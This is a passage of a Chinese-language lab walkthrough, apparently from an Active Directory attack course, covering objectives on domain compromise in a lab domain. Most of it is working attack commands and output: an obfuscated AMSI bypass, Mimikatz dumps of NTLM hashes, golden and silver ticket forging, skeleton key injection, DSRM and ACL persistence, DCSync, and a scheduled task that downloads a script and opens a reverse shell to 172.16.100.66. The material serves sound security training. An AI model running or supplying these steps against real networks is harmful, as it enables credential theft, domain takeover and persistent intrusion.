dcorp-std363
dcorp-std360
dcorp-std362
dcorp-std364
dcorp-std370
dcorp-std369
dcorp-std368
dcorp-std365
dcorp-std367
dcorp-std361
dcorp-ci
dcorp-std366
dcorp-mssql
dcorp-sql1
dcorp-appsrv
```

可以以本地管理员身份登录到dcorp-dc
```
PS C:\ad> Enter-PSSession -ComputerName dcorp-dc.dollarcorp.moneycorp.local
[dcorp-dc.dollarcorp.moneycorp.local]: PS C:\Users\svcadmin\Documents> hostname
dcorp-dc
```
回到学生有AD权限的学生机器shell里，用下面命令导出dcorp-dc里的所有哈希
```Invoke-Mimikatz -Command '"lsadump::lsa /patch"' –Computername dcorp-dc ```

操作步骤如下：
```
Windows PowerShell
Copyright (C) 2016 Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> cd c:/ad
PS C:\ad> powershell -ep bypass
Windows PowerShell
Copyright (C) 2016 Microsoft Corporation. All rights reserved.

PS C:\ad> S`eT-It`em ( 'V'+'aR' + 'IA' + ('blE:1'+'q2') + ('uZ'+'x') ) ([TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( Get-varI`A`BL
E (('1Q'+'2U') +'zX' ) -VaL )."A`ss`Embly"."GET`TY`Pe"(("{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'a
ge'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em') ) )."g`etf`iElD"( ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'ai
le') ),( "{2}{4}{0}{1}{3}" -f('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
PS C:\ad> . .\Invoke-Mimikatz.ps1
PS C:\ad> Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername dcorp-dc

  .#####.   mimikatz 2.1.1 (x64) built on Nov 29 2018 12:37:56
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ** Kitten Edition **
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(powershell) # lsadump::lsa /patch
Domain : dcorp / S-1-5-21-1874506631-3219952063-538504511

RID  : 000001f4 (500)
User : Administrator
LM   :
NTLM : af0686cc0ca8f04df42210c9ac980760

RID  : 000001f5 (501)
User : Guest
LM   :
NTLM :

RID  : 000001f6 (502)
User : krbtgt
LM   :
NTLM : ff46a9d8bd66c6efd77603da26796f35

RID  : 000001f7 (503)
User : DefaultAccount
LM   :
NTLM :

RID  : 00000455 (1109)
User : ciadmin
LM   :
NTLM : e08253add90dccf1a208523d02998c3d

RID  : 00000458 (1112)
User : sqladmin
LM   :
NTLM : 07e8be316e3da9a042a9cb681df19bf5

RID  : 00000459 (1113)
User : websvc
LM   :
NTLM : cc098f204c5887eaa8253e7c2749156f

RID  : 0000045b (1115)
User : srvadmin
LM   :
NTLM : a98e18228819e8eec3dfa33cb68b0728

RID  : 0000045d (1117)
User : appadmin
LM   :
NTLM : d549831a955fee51a43c83efb3928fa7

RID  : 00000461 (1121)
User : mgmtadmin
LM   :
NTLM : 95e2cd7ff77379e34c6e46265e75d754

RID  : 00000462 (1122)
User : svcadmin
LM   :
NTLM : b38ff50264b74508085d82c69794a4d8

RID  : 0000046b (1131)
User : studentadmin
LM   :
NTLM : d1254f303421d3cdbdc4c73a5bce0201

RID  : 00000470 (1136)
User : sql1admin
LM   :
NTLM : e999ae4bd06932620a1e78d2112138c6

RID  : 000003e8 (1000)
User : DCORP-DC$
LM   :
NTLM : 126289c16302fb23b71ec09f0d3d5391
```


问题：NTLM hash of krbtgt
答案：ff46a9d8bd66c6efd77603da26796f35

问题：NTLM hash of domain administrator - Administrator
答案: af0686cc0ca8f04df42210c9ac980760

## 制作金票


使用krbtgt和它的NTML哈希制作金票
```
PS C:\ad> Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-
21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 id:500 /groups:512 /startoffset:0 /endin:600
 /renewmax:10080 /ptt"'

  .#####.   mimikatz 2.1.1 (x64) built on Nov 29 2018 12:37:56
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ** Kitten Edition **
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(powershell) # kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt
User      : Administrator
Domain    : dollarcorp.moneycorp.local (DOLLARCORP)
SID       : S-1-5-21-1874506631-3219952063-538504511
User Id   : 500
Groups Id : *512
ServiceKey: ff46a9d8bd66c6efd77603da26796f35 - rc4_hmac_nt
Lifetime  : 2/13/2022 10:02:06 PM ; 2/14/2022 8:02:06 AM ; 2/20/2022 10:02:06 PM
-> Ticket : ** Pass The Ticket **

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for 'Administrator @ dollarcorp.moneycorp.local' successfully submitted for current session
```

可以查看是否能进入dcorp-dc的c盘来检查当前session是否有目标机器的Administrator权限
```
PS C:\ad> whoami
dcorp\student366
PS C:\ad> ls \\dcorp-dc.dollarcorp.moneycorp.local\c$


    Directory: \\dcorp-dc.dollarcorp.moneycorp.local\c$


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       11/29/2019   1:32 AM                PerfLogs
d-r---        2/16/2019   9:14 PM                Program Files
d-----        7/16/2016   6:23 AM                Program Files (x86)
d-r---       12/14/2019   8:23 PM                Users
d-----        8/20/2020   2:05 AM                Windows
```

可以用当前DC上的Administrator的shell，把学生机器添加进DA

```net group "Domain Admins" student366 /ADD /DOMAIN```


# Learning Objective 9:

> Task
> ● Try to get command execution on the domain controller by creating silver ticket for:
> − HOST service
> − WMI


金票和银票的分别
> 1.金票伪造的TGT(Ticket GrantingTicket)，所以可以获取任何Kerberos服务权限
> 2.银票是伪造的TGS的TS，只能访问指定的服务权限
> 3.GoldenTicket是由krbtgt的hash加密
> 4.Silver Ticket是由服务账户（通常为计算机账户）hash加密
> 5.GoldenTicket在使用的过程需要同域控通信
> 6.Silver Ticket在使用的过程不需要同域控通信


上面我们已经知道了DCORP-DC$的哈希，
```
RID  : 000003e8 (1000)
User : DCORP-DC$
LM   :
NTLM : 126289c16302fb23b71ec09f0d3d5391
```
可以用来制作银票

```
PS C:\ad> Invoke-Mimikatz -Command '"kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /target:dcorp-dc.dollarcorp.moneycorp.local /service:HOST /rc4:126289c16302fb23b71ec09f0d3d5391 /user:Administrator /ptt"'

  .#####.   mimikatz 2.1.1 (x64) built on Nov 29 2018 12:37:56
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ** Kitten Edition **
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(powershell) # kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /target:dcorp-dc.dollarcorp.moneycorp.local /service:HOST /rc4:126289c16302fb23b71ec09f0d3d5391 /user:Administrator /ptt
User      : Administrator
Domain    : dollarcorp.moneycorp.local (DOLLARCORP)
SID       : S-1-5-21-1874506631-3219952063-538504511
User Id   : 500
Groups Id : *513 512 520 518 519
ServiceKey: 126289c16302fb23b71ec09f0d3d5391 - rc4_hmac_nt
Service   : HOST
Target    : dcorp-dc.dollarcorp.moneycorp.local
Lifetime  : 2/13/2022 10:31:17 PM ; 2/11/2032 10:31:17 PM ; 2/11/2032 10:31:17 PM
-> Ticket : ** Pass The Ticket **

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for 'Administrator @ dollarcorp.moneycorp.local' successfully submitted for current session
```

现在当前shell下我们已经有了一个DC上Administrator的session

新建一个定时任务，反弹dc上的一个shell回来。需要注意Invoke-PowerShellTcp.ps1里最后一行要加上
```
Power -Reverse -IPAddress 172.16.100.66 -Port 443
```
表示调用自己

```
PS C:\ad> schtasks /create /S dcorp-dc.dollarcorp.moneycorp.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "User366" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.66/Invoke-PowerShellTcp.ps1''')'"

SUCCESS: The scheduled task "User366" has successfully been created.
```

触发定时任务
```
PS C:\ad> schtasks /Run /S dcorp-dc.dollarcorp.moneycorp.local /TN "User366"
SUCCESS: Attempted to run the scheduled task "User366".
```

收到反弹回来的DC上的shell
```
PS C:\ad> .\nc.exe -lnvp 443
listening on [any] 443 ...
connect to [172.16.100.66] from (UNKNOWN) [172.16.2.1] 49762
Windows PowerShell running as user DCORP-DC$ on DCORP-DC
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Windows\system32>hostname
dcorp-dc
PS C:\Windows\system32> whoami
nt authority\system
```

问题：The service whose Silver Ticket can be used for scheduling tasks
答案：HOST

# Learning Objective 10:

> Task
> ● Use Domain Admin privileges obtained earlier to execute the Skeleton Key attack.

## 制作万能钥匙

### 方法1
在一台有DA权限的shell里运行下面命令
```
PS C:\ad> . .\Invoke-Mimikatz.ps1
PS C:\ad> Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName dcorp-dc.dollarcorp.moneycorp.loc
al

  .#####.   mimikatz 2.1.1 (x64) built on Nov 29 2018 12:37:56
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ** Kitten Edition **
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(powershell) # privilege::debug
Privilege '20' OK

mimikatz(powershell) # misc::skeleton
[KDC] data
[KDC] struct
[KDC] keys patch OK
[RC4] functions
[RC4] init patch OK
[RC4] decrypt patch OK
```

现在所有计算机都可以使用密码：```mimikatz```访问

开一个学生shell使用下面命令以Administrator的身份登录DC
```Enter-PSSession –Computername dcorp-dc –credential dcorp\Administrator```



### 方法2(推荐)

进入DC
```
Enter-PSSession –Computername dcorp-dc –credential dcorp\Spiderman
```

在DC中关闭AMSI
```
[dcorp-dc]: PS C:\Users\Administrator\Documents> S`eT-It`em ( 'V'+'aR' + 'IA' + ('blE:1'+'q2') + ('uZ'+'x') ) ([TYpE]( "{1}{0}"-F'F','r
E' ) ) ; ( Get-varI`A`BLE (('1Q'+'2U') +'zX' ) -VaL )."A`ss`Embly"."GET`TY`Pe"(("{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),(
'.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em') ) )."g`etf`iElD"( ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile') )
,( "{2}{4}{0}{1}{3}" -f('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
```

回到学生机器,创建一个DC的登录session
```
$sess = New-PSSession dcorp-dc.dollarcorp.moneycorp.local
```

把mimikatz加载到指定session
```
 Invoke-Command -FilePath C:\AD\Invoke-Mimikatz.ps1 -Session $sess
```

再次进入DC
```
 Enter-PSSession -Session $sess
```

执行mimikatz，制作万能钥匙
```
Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"'
```

开一个学生shell使用下面命令以student370的身份进入主机
```Enter-PSSession –Computername dcorp-std370 –credential dcorp\student370```

问题：In which process is the skeleton key injected?
答案：LSASS

# Learning Objective 11:

> Task
> ● Use Domain Admin privileges obtained earlier to abuse the DSRM credential for persistence.


## DSRM利用

目录服务还原模式。除了krbtgt服务帐号外，域控上还有个可利用的账户：目录服务还原模式（DSRM）账户，这个密码是在DC安装的时候设置的，所以一般不会被修改

用有DA权限的shell，运行下面命令，dump出DSRM的哈希密码
```
PS C:\ad> Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"' -Computername dcorp-dc

  .#####.   mimikatz 2.1.1 (x64) built on Nov 29 2018 12:37:56
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ** Kitten Edition **
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(powershell) # token::elevate
Token Id  : 0
User name :
SID name  : NT AUTHORITY\SYSTEM

544     {0;000003e7} 1 D 17963          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary
 -> Impersonated !
 * Process Token : {0;00783275} 0 D 7877279     dcorp\svcadmin  S-1-5-21-1874506631-3219952063-538504511-1122   (12g,26p)       Primary
 * Thread Token  : {0;000003e7} 1 D 7921384     NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)

mimikatz(powershell) # lsadump::sam
Domain : DCORP-DC
SysKey : 85462b93fc25ee67bb07ad899096199b
Local SID : S-1-5-21-1752050383-1088309824-3131404450

SAMKey : 33e0913ef3886d77d5873060bcea1cfb

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: a102ad5753f4c441e3af31c97fad86fd

RID  : 000001f5 (501)
User : Guest

RID  : 000001f7 (503)
User : DefaultAccount
```

可以看到这里的Administrator的哈希(也就是DSRM的密码)是：```a102ad5753f4c441e3af31c97fad86fd```

再用下面命令dump出现在Administrator的密码，与上面DSRM的密码进行比较
```
PS C:\ad> Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername dcorp-dc

  .#####.   mimikatz 2.1.1 (x64) built on Nov 29 2018 12:37:56
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ** Kitten Edition **
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(powershell) # lsadump::lsa /patch
Domain : dcorp / S-1-5-21-1874506631-3219952063-538504511

RID  : 000001f4 (500)
User : Administrator
LM   :
NTLM : af0686cc0ca8f04df42210c9ac980760

(略)
```
新的密码是：```af0686cc0ca8f04df42210c9ac980760```

DSRM administrator不允许登陆，用之前的session进入DC修改
```
PS C:\ad> Enter-PSSession $sess
[dcorp-dc.dollarcorp.moneycorp.local]: PS C:\Users\svcadmin\Documents> S`eT-It`em ( 'V'+'aR' + 'IA' + ('blE:1'+'q2') + (
'uZ'+'x') ) ([TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( Get-varI`A`BLE (('1Q'+'2U') +'zX' ) -VaL )."A`ss`Embly"."GET`TY`Pe"(("{6
}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em') ) ).
"g`etf`iElD"( ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile') ),( "{2}{4}{0}{1}{3}" -f('S'+'tat'),'i',('Non'+'Publ'+
'i'),'c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
```

运行下面命令，修改DSRM的远程登录策略
```
[dcorp-dc.dollarcorp.moneycorp.local]: PS C:\Users\svcadmin\Documents> New-ItemProperty "HKLM:\System\CurrentControlSet\
Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD


DsrmAdminLogonBehavior : 2
PSPath                 : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa\
PSParentPath           : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control
PSChildName            : Lsa
PSDrive                : HKLM
PSProvider             : Microsoft.PowerShell.Core\Registry
```

现在用DSRM的原始哈希，来运行一个有DA权限的shell
```
Invoke-Mimikatz -Command '"sekurlsa::pth /domain:dcorp-dc /user:Administrator /ntlm:a102ad5753f4c441e3af31c97fad86fd /run:powershell.exe"'
```


问题： Name of the Registry key modified to change Logon behavior of DSRM administrator
答案： DsrmAdminLogonBehavior

# Learning Objective 12:

> Task
> ● Check if studentx has Replication (DCSync) rights.
> ● If yes, execute the DCSync attack to pull hashes of the krbtgt user.
> ● If no, add the replication rights for the studentx and execute the DCSync attack to pull hashes of the krbtgt user.

## Dcsync 攻击

新开一个学生shell（没有DA权限），查找当前账号是否有DCSync的权限
```
PS C:\ad> . .\PowerView.ps1
PS C:\ad> Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.IdentityReference -match "student366") -and (($_.ObjectType -m
atch'replication') -or ($_.ActiveDirectoryRights -match 'GenericAll'))}
```

没有任何返回

执行DCsync，获取krbtgt的账号信息，返回报错
```
PS C:\ad> . .\Invoke-Mimikatz.ps1
PS C:\ad> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'

  .#####.   mimikatz 2.1.1 (x64) built on Nov 29 2018 12:37:56
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ** Kitten Edition **
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(powershell) # lsadump::dcsync /user:dcorp\krbtgt
[DC] 'dollarcorp.moneycorp.local' will be the domain
[DC] 'dcorp-dc.dollarcorp.moneycorp.local' will be the DC server
[DC] 'dcorp\krbtgt' will be the user account
ERROR kuhl_m_lsadump_dcsync ; GetNCChanges: 0x000020f7 (8439)
```

证明当前账号是没有DCsync权限的。

来到有DA权限的shell

添加完全控制权限
```
Add-ObjectAcl -TargetDistinguishedName 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalSamAccountName student366 -Rights All -Verbose
```
再把Dcsync权限赋予当前学生账号student366
```
Add-ObjectAcl -TargetDistinguishedName"dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName student366 -Rights DCSync -Verbose
```

现在回到学生机shell，再次查看本账号是否有Dcsync权限
```
PS C:\ad> Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.IdentityReference -match "student366") -and (($_.ObjectType -match'replication') -or ($_.ActiveDirectoryRights -match 'GenericAll'))}


InheritedObjectType   : All
ObjectDN              : DC=dollarcorp,DC=moneycorp,DC=local
ObjectType            : All
IdentityReference     : dcorp\student366
IsInherited           : False
ActiveDirectoryRights : GenericAll
PropagationFlags      : None
ObjectFlags           : None
InheritanceFlags      : None
InheritanceType       : None
AccessControlType     : Allow
ObjectSID             : S-1-5-21-1874506631-3219952063-538504511
```

现在看到已经显示有GenericAll权限

执行Dcsync,导出krbtgt哈希（也可以是其他用户）
```
PS C:\ad> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'

  .#####.   mimikatz 2.1.1 (x64) built on Nov 29 2018 12:37:56
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ** Kitten Edition **
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(powershell) # lsadump::dcsync /user:dcorp\krbtgt
[DC] 'dollarcorp.moneycorp.local' will be the domain
[DC] 'dcorp-dc.dollarcorp.moneycorp.local' will be the DC server
[DC] 'dcorp\krbtgt' will be the user account

Object RDN           : krbtgt

** SAM ACCOUNT **

SAM Username         : krbtgt
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   :
Password last change : 2/16/2019 11:01:46 PM
Object Security ID   : S-1-5-21-1874506631-3219952063-538504511-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: ff46a9d8bd66c6efd77603da26796f35
    ntlm- 0: ff46a9d8bd66c6efd77603da26796f35
    lm  - 0: b14d886cf45e2efb5170d4d9c4085aa2

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 6cb7f438bf5c099fe4d029ebb5c6e08e

* Primary:Kerberos-Newer-Keys *
    Default Salt : DOLLARCORP.MONEYCORP.LOCALkrbtgt
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : e28b3a5c60e087c8489a410a1199235efaf3b9f125972c7a1e7618a7469bfd6a
      aes128_hmac       (4096) : 4cffc651ba557c963b71b49d1add2e6b
      des_cbc_md5       (4096) : bf5d7319947f54c7

* Primary:Kerberos *
    Default Salt : DOLLARCORP.MONEYCORP.LOCALkrbtgt
    Credentials
      des_cbc_md5       : bf5d7319947f54c7

* Packages *
    NTLM-Strong-NTOWF

* Primary:WDigest *
    01  7b766fa41d1e30157b6c0113528e63ea
    02  1bda631fac0fdec6cedfecbc7a99e30d
    03  d7be969eaa4b841a9914e2a5eff571f7
    04  7b766fa41d1e30157b6c0113528e63ea
    05  1bda631fac0fdec6cedfecbc7a99e30d
    06  8835f5f828c434a2fe077eb224e25943
    07  7b766fa41d1e30157b6c0113528e63ea
    08  8fdecaac2296648db5620a13723f60b5
    09  8fdecaac2296648db5620a13723f60b5
    10  aace962cfe8ebce04c9ed249e98369d3
    11  6424d51e82fdc5e6a2f0559032cbead2
    12  8fdecaac2296648db5620a13723f60b5
    13  76e039370f352eaaff05fd2f6f8239d6
    14  6424d51e82fdc5e6a2f0559032cbead2
    15  acc424fd2c2c10d7e46950ad93e065c6
    16  acc424fd2c2c10d7e46950ad93e065c6
    17  734df139b9ceac875a011e24df53d335
    18  e399f39adefad64659a67171b4399221
    19  80cfc6a03006436b02bf3d27e8374444
    20  04a4819688c0185368738acd7a8e12c4
    21  4c60210b91d6e0fddc8a54f16337b218
    22  4c60210b91d6e0fddc8a54f16337b218
    23  ca7e51aef08dffca06881110ea03bf1d
    24  36b3cac402a4005af573f1105ed14b3a
    25  36b3cac402a4005af573f1105ed14b3a
    26  b35c755b303bec7b4b7091a2f96d789f
    27  58300e76fcc0c2c854c8cda6363470e2
    28  2f6cbfe287e89f7f4829f443854857fd
    29  610788375bd98bebd50561d66fcf8f74
```

问题：Attack that can be executed with Replication rights (no DA privileges required)
答案：dcsync

# Learning Objective 13:

> Task
> ● Modify security descriptors on dcorp-dc to get access using PowerShell remoting and WMI without requiring administrator access.
> ● Retrieve machine account hash from dcorp-dc without using administrator access and use that to execute a Silver Ticket attack to get code execution with WMI.

## 安全描述符


在DA权限shell引入RACE.ps1框架
```
PS C:\ad> . .\RACE.ps1
```

为WMI修改安全描述符，允许student366进入WMI
```
Set-RemoteWMI -SamAccountName student366 -ComputerName dcorp-dc.dollarcorp.moneycorp.local -namespace 'root\cimv2' -Verbose
```

查看
```
gwmi -class win32_operatingsystem -ComputerName dcorp-dc.dollarcorp.moneycorp.local
```

### 没有登录凭证，修改安全描述符，使得学生机可以在DC上执行命令

设置远程权限，报错
```
PS C:\ad> Set-RemotePSRemoting -SamAccountName student366 -ComputerName dcorp-dc -Verbose
Processing data for a remote command failed with the following error message: The I/O operation has been aborted
because of either a thread exit or an application request. For more information, see the about_Remote_Troubleshooting
Help topic.
    + CategoryInfo          : OperationStopped: (dcorp-dc:String) [], PSRemotingTransportException
    + FullyQualifiedErrorId : JobFailure
    + PSComputerName        : dcorp-dc
```

引入RACE.ps1，域名写全
```
PS C:\ad> . .\RACE.ps1
PS C:\ad> Set-RemotePSRemoting -SamAccountName student366 -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Verbose
```


执行whoami命令
```
Invoke-Command -ScriptBlock{whoami} -ComputerName dcorp-dc.dollarcorp.moneycorp.local
```


### 无管理员密码的情况下从目标机器上dump出哈希

在DC上修改权限，允许本账号（student366）远程dump出哈希，在DAshell
```
Add-RemoteRegBackdoor -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Trustee student366 -Verbose
```

在学生shell
引入框架
```
PS C:\ad> . .\RACE.ps1
```

dump出dcorp-dc这台机器的哈希
```
PS C:\ad> Get-RemoteMachineAccountHash -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Verbose
VERBOSE: Bootkey/SysKey : 85462B93FC25EE67BB07AD899096199B
VERBOSE: LSA Key        : FD3251451B1293B9ED7AF4BED8E19A678F514B9BC2B42B796E2C72AF156945E9

ComputerName                        MachineAccountHash
------------                        ------------------
dcorp-dc.dollarcorp.moneycorp.local 126289c16302fb23b71ec09f0d3d5391
```

现在我们有了这台机器的哈希，可以用来制作银票

基于HOST服务的银票
```
PS C:\ad> . .\Invoke-Mimikatz.ps1
PS C:\ad> Invoke-Mimikatz -Command '"kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-321995
2063-538504511 /target:dcorp-dc.dollarcorp.moneycorp.local /service:HOST /rc4:126289c16302fb23b71ec09f0d3d5391 /user:Adm
inistrator /ptt"'

  .#####.   mimikatz 2.1.1 (x64) built on Nov 29 2018 12:37:56
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ** Kitten Edition **
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(powershell) # kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511
 /target:dcorp-dc.dollarcorp.moneycorp.local /service:HOST /rc4:126289c16302fb23b71ec09f0d3d5391 /user:Administrator /pt
t
User      : Administrator
Domain    : dollarcorp.moneycorp.local (DOLLARCORP)
SID       : S-1-5-21-1874506631-3219952063-538504511
User Id   : 500
Groups Id : *513 512 520 518 519
ServiceKey: 126289c16302fb23b71ec09f0d3d5391 - rc4_hmac_nt
Service   : HOST
Target    : dcorp-dc.dollarcorp.moneycorp.local
Lifetime  : 2/14/2022 2:09:44 AM ; 2/12/2032 2:09:44 AM ; 2/12/2032 2:09:44 AM
-> Ticket : ** Pass The Ticket **

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for 'Administrator @ dollarcorp.moneycorp.local' successfully submitted for current session
```

基于RPCSS服务的银票
```
PS C:\ad> Invoke-Mimikatz -Command '"kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-321995
2063-538504511 /target:dcorp-dc.dollarcorp.moneycorp.local /service:RPCSS /rc4:126289c16302fb23b71ec09f0d3d5391 /user:Ad
ministrator /ptt"'

  .#####.   mimikatz 2.1.1 (x64) built on Nov 29 2018 12:37:56
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ** Kitten Edition **
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(powershell) # kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511
 /target:dcorp-dc.dollarcorp.moneycorp.local /service:RPCSS /rc4:126289c16302fb23b71ec09f0d3d5391 /user:Administrator /p
tt
User      : Administrator
Domain    : dollarcorp.moneycorp.local (DOLLARCORP)
SID       : S-1-5-21-1874506631-3219952063-538504511
User Id   : 500
Groups Id : *513 512 520 518 519
ServiceKey: 126289c16302fb23b71ec09f0d3d5391 - rc4_hmac_nt
Service   : RPCSS
Target    : dcorp-dc.dollarcorp.moneycorp.local
Lifetime  : 2/14/2022 2:12:08 AM ; 2/12/2032 2:12:08 AM ; 2/12/2032 2:12:08 AM
-> Ticket : ** Pass The Ticket **

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for 'Administrator @ dollarcorp.moneycorp.local' successfully submitted for current session
```

gwmi -Class win32_operatingsystem -ComputerName dcorp-dc.dollarcorp.moneycorp.local


问题：SDDL string that provides studentx same permissions as BA on root\cimv2 WMI namespace. Flag value is the permissions string from (A;CI;Permissions String;;;SID)

答案：CCDCLCSWRPWPRCWD

# Learning Objective 14:

> Task
